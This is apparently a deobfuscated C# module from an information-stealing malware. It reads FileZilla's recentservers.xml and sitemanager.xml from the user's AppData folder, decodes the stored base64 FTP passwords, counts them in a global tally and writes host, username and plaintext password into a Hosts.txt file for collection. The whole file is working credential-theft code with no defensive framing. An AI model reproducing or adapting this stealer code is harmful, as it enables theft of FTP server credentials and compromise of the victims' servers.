using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;
using ns13;

namespace ns3;

internal sealed class Class12
{
	private static string[] smethod_0()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\";
		return new string[2]
		{
			text + "recentservers.xml",
			text + "sitemanager.xml"
		};
	}

	public static List<GStruct10> smethod_1()
	{
		List<GStruct10> list = new List<GStruct10>();
		string[] array = smethod_0();
		if (!File.Exists(array[0]) && !File.Exists(array[1]))
		{
			return list;
		}
		string[] array2 = array;
		foreach (string text in array2)
		{
			try
			{
				if (!File.Exists(text))
				{
					continue;
				}
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(text);
				foreach (XmlNode item2 in xmlDocument.GetElementsByTagName("Server"))
				{
					GStruct10 item = default(GStruct10);
					item.String_0 = "ftp://" + item2["Host"]!.InnerText + ":" + item2["Port"]!.InnerText + "/";
					item.String_1 = item2["User"]!.InnerText;
					item.String_2 = Encoding.UTF8.GetString(Convert.FromBase64String(item2["Pass"]!.InnerText));
					Class55.int_10++;
					list.Add(item);
				}
			}
			catch
			{
			}
		}
		return list;
	}

	private static string smethod_2(GStruct10 gstruct10_0)
	{
		return $"Url: {gstruct10_0.String_0}\nUsername: {gstruct10_0.String_1}\nPassword: {gstruct10_0.String_2}\n\n";
	}

	public static void smethod_3(List<GStruct10> list_0, string string_0)
	{
		if (list_0.Count == 0)
		{
			return;
		}
		Directory.CreateDirectory(string_0);
		foreach (GStruct10 item in list_0)
		{
			File.AppendAllText(string_0 + "\\Hosts.txt", smethod_2(item));
		}
	}
}
